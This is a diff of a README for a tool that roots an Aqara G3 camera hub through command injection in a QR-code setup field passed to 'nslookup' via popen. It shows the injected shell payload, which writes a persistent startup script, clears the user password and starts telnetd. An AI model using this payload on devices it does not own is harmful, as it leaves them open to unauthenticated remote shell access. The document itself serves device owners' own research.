@@ -8,9 +8,13 @@
 
 Intro
 ---------------
-I was disappointed to see the Aqara G3 camera did not ship with telnet enabled so I managed to grab a copy of a firmware update for some good 'ol static analysis which confirmed none of the previous methods were going to work. Whilst going through  "ha_master" I did see that one of the variables passed in by the setup qrcode is thrown through sprintf as "nslookup %s" and subsequently passed to popen. (yay)
-Getting telnet was fairly trivial, getting persistent telnet in one shot within the 132 char sprintf buffer and on a readonly filesystem was a little more challenging.
-(Aqara have also changed their key ciphering for ssid and pwd)
+I was disappointed to see the Aqara G3 camera did not ship with telnet enabled so I managed to grab a copy of a firmware update for some good 'ol static analysis which confirmed none of the previous methods were going to work.
+
+Whilst going through  "ha_master" I did see that one of the variables passed in by the setup qrcode is thrown through sprintf as "nslookup %s" and subsequently passed to popen (yay).
+
+Getting telnet was fairly trivial, getting persistent telnet in one shot within the 132 char sprintf buffer on a readonly filesystem was a little more challenging.
+
+Thankfully another qrcode variable (b aka bind_key) has a larger buffer so we store some data in this which can later be used by the main payload.
 
 
 Usage
@@ -18,7 +22,7 @@ Usage
 ```bash
 usage: aQRootG3.py [-h] ssid pwd [filename]
 
-aQRootG3 v0.1
+aQRootG3 v0.2
 Enable telnet via qrcode command injection for Aqara G3 hub
 
 positional arguments:
@@ -56,22 +60,18 @@ Linux Camera-Hub-G3-BEEF 4.9.84 #67 SMP PREEMPT Mon Sep 6 17:51:23 CST 2021 armv
 Payload Explanation
 ---------------
 ```python
-payload = {
-    "b": f"lumiLZc1dhEfPzMN",               # Made up bind_key
-    "d": ";".join(
-        [
-            domain,                         # Domain being queried by nslookup, defaulting to "aiot-coap.aqara.cn"
-            'x="fw_""manager.sh"',          # Workaround - Script checks if it's already running by grepping ps.
-            "$x -t -k",                     # Enable tty and telnetd
-            "$x -t -f",                     # Create default /data/scripts/post_init.sh
-            "y=/data/scripts/post_init.sh",
-            'echo "$x -t -k" >> $y',        # Append tty enable and telnetd start to post_init script
-            "chmod 555 $y",                 # Remove write access to post_init script
-        ]
-    ),
-    "x": cipher(ssid.encode()),             # Ciphered SSID
-    "y": cipher(pwd.encode()),              # Ciphered Wireless Password
-    "l": "en",                              # Language
+payload=[
+    'y=/data/scripts/post_init.sh',         
+    '"fw_man"ager.sh -t -f',                        # Create default /data/scripts/post_init.sh
+    'echo -e `agetprop persist.app.bind_key`>$y',   # Write post_init[] content below to post_init.sh
+    'tail -n2 $y|sh'                                # Clear $USER password, enable tty and start telnetd
+],
+post_init = [
+    '#!/bin/sh',
+    'fw_manager.sh -r',                             # Start firmware as normal
+    'passwd -d $USER',                              # Clear $USER password
+    'fw_manager.sh -t -k'                           # Enable tty and start telnetd
+],
 }
 ```
 
